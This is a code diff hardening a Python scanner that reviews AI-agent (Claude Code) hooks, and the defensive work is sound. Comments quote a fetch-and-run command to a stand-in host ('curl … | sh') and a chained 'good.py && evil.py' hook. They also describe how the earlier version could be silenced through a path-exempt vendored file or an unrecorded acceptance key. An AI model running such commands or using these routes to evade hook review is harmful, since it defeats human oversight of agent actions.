@@ -1537,16 +1537,24 @@ def hook_entries(root: Path) -> list[tuple[str, str, str]]:
     return out
 
 
-def hook_script(root: Path, command: str) -> Path | None:
-    """The file a hook runs, when the command names one inside the project."""
+def hook_scripts(root: Path, command: str) -> list[Path]:
+    """EVERY file a hook runs, not the first.
+
+    The first version returned one, so `python3 good.py && python3 evil.py` was reviewed by reading
+    `good.py`. A command is a command line, not a command."""
     expanded = command.replace('"$CLAUDE_PROJECT_DIR"', str(root)).replace("$CLAUDE_PROJECT_DIR", str(root))
-    for token in shlex.split(expanded, posix=True) if expanded.strip() else []:
+    try:
+        tokens = shlex.split(expanded, posix=True) if expanded.strip() else []
+    except ValueError:            # an unbalanced quote: fall back to whitespace, never to silence
+        tokens = expanded.split()
+    out = []
+    for token in tokens:
         # `curl https://x.test/i.sh | sh` ends in `.sh` and is not a path. A URL is a URL.
         if "://" in token:
             continue
         if re.search(r"\.(?:py|mjs|cjs|js|ts|sh)$", token):
-            return Path(token) if Path(token).is_absolute() else root / token
-    return None
+            out.append(Path(token) if Path(token).is_absolute() else root / token)
+    return out
 
 
 def review_hooks(root: Path) -> list[Finding]:
@@ -1558,40 +1566,48 @@ def review_hooks(root: Path) -> list[Finding]:
             if pat.search(command) and code not in seen:
                 seen.add(code)
                 found.append(Finding(code, level, event, HOOK_CODES[code], command[:150]))
-        script = hook_script(root, command)
-        if script is None:
+        scripts = hook_scripts(root, command)
+        if not scripts:
             # An inline shell command, already judged by the rules above. H6 asks where a SCRIPT
             # lives; saying it of a command that has none is a finding with no action behind it.
             continue
-        if not script.is_relative_to(root):
-            found.append(Finding("H6", "review", event, HOOK_CODES["H6"],
-                                 f"{where}: {script} is outside the project"))
-        elif "$CLAUDE_PROJECT_DIR" not in command and Path(command.split()[-1]).is_absolute():
-            found.append(Finding("H6", "review", event, HOOK_CODES["H6"],
-                                 f"{where}: absolute path — committed, it breaks on every other machine"))
-        if not script.exists():
-            found.append(Finding("H8", "block", event, HOOK_CODES["H8"], f"{where}: {script} does not exist"))
-            continue
-        # Our own vendored hook IS this file, and `check` already verifies it byte for byte.
-        # Scanning it finds this script's own rule patterns — the scanner matching its own text,
-        # which is how the first version of this function reported `curl … | sh` on itself.
-        # Exempt by PATH, not by bytes: the vendored copy is written from the INSTALLED skill, so
-        # comparing it to the file running right now differs whenever the repo is ahead. `check`
-        # already reports that drift, with a better message.
-        if script.resolve() in {Path(__file__).resolve(), (root / HOOK_COPY).resolve()}:
-            continue
-        body = script.read_text(encoding="utf-8", errors="replace")
-        if AUTO_ALLOW.search(body) and not re.search(r'permissionDecision["\']?\s*[:=]\s*["\'](?:deny|ask)["\']', body):
-            found.append(Finding("H4", "block", event, HOOK_CODES["H4"],
-                                 f"{where}: {script.name} only ever decides `allow`"))
-        # A pattern in a SCRIPT is text, not a proven call: a comment, a string, a rule that blocks
-        # the very thing it names. The configured command is a command; a file is source. So the
-        # body never blocks — it asks a person to read the line.
-        for code, _level, pat in HOOK_RULES:
-            if (m := pat.search(body)) and not any(f.code == code and script.name in f.where for f in found):
-                found.append(Finding(code, "review", event, HOOK_CODES[code],
-                                     f"{script.name}: " + " ".join(m.group(0).split())[:110]
-                                     + " — in the script's text; read the line before judging it"))
+        for script in scripts:
+            if not script.is_relative_to(root):
+                found.append(Finding("H6", "review", event, HOOK_CODES["H6"],
+                                     f"{where}: {script} is outside the project"))
+            elif "$CLAUDE_PROJECT_DIR" not in command and Path(command.split()[-1]).is_absolute():
+                found.append(Finding("H6", "review", event, HOOK_CODES["H6"],
+                                     f"{where}: absolute path — committed, it breaks on every other machine"))
+            if not script.exists():
+                found.append(Finding("H8", "block", event, HOOK_CODES["H8"], f"{where}: {script} does not exist"))
+                continue
+            # Our own vendored hook IS this file, and `check` already verifies it byte for byte.
+            # Scanning it finds this script's own rule patterns — the scanner matching its own text,
+            # which is how the first version of this function reported `curl … | sh` on itself.
+            # Trust by CONTENT, never by name. Exempting `.claude/hooks/registry_intake.py` by path
+            # made the one file this scanner refuses to read the best place to put something: overwrite
+            # the vendored copy and the review went silent. It is skipped only while it still IS this
+            # script, byte for byte; a copy that has drifted gets scanned like anything else, and says so.
+            body = script.read_text(encoding="utf-8", errors="replace")
+            if script.resolve() == Path(__file__).resolve():
+                continue
+            if script.resolve() == (root / HOOK_COPY).resolve():
+                if script.read_bytes() == Path(__file__).read_bytes():
+                    continue
+                found.append(Finding("H6", "review", event, HOOK_CODES["H6"],
+                                     f"{where}: {HOOK_COPY} is not the installed skill — scanned as "
+                                     "third-party; `setup` refreshes it"))
+            if AUTO_ALLOW.search(body) and not re.search(r'permissionDecision["\']?\s*[:=]\s*["\'](?:deny|ask)["\']', body):
+                found.append(Finding("H4", "block", event, HOOK_CODES["H4"],
+                                     f"{where}: {script.name} only ever decides `allow`"))
+            # A pattern in a SCRIPT is text, not a proven call: a comment, a string, a rule that blocks
+            # the very thing it names. The configured command is a command; a file is source. So the
+            # body never blocks — it asks a person to read the line.
+            for code, _level, pat in HOOK_RULES:
+                if (m := pat.search(body)) and not any(f.code == code and script.name in f.where for f in found):
+                    found.append(Finding(code, "review", event, HOOK_CODES[code],
+                                         f"{script.name}: " + " ".join(m.group(0).split())[:110]
+                                         + " — in the script's text; read the line before judging it"))
     return found
 
 
@@ -1614,10 +1630,16 @@ def cmd_hook_review(args) -> int:
 
 
 def check_hooks(root: Path, lock: dict) -> list[str]:
-    """Blocking hook findings are a problem for `check`; the review-level ones are a report."""
-    accepted = (lock.get("hooks") or {}).get("accepted") or {}
+    """Blocking hook findings are a problem for `check`; the review-level ones are a report.
+
+    **There is no acceptance path here, deliberately.** The first version read
+    `lock["hooks"]["accepted"]` and dropped any blocking finding listed there — a key nothing ever
+    wrote, with no `--by` and no reviewer, which the PreToolUse `ask` gate (that covers `allow`,
+    `approve`, `skill-approve` and `mcp-approve`) knew nothing about. On the one surface that runs
+    without the agent choosing to, that is a hand edit away from silence. A blocking hook finding
+    is fixed, not waved through; if acceptance is ever needed it gets a real command with `--by`."""
     return [f"hook {f.code} ({f.item}): {f.message} — {f.where}"
-            for f in review_hooks(root) if f.level == "block" and f.code not in accepted]
+            for f in review_hooks(root) if f.level == "block"]
 
 
 HOOK_COPY = ".claude/hooks/registry_intake.py"
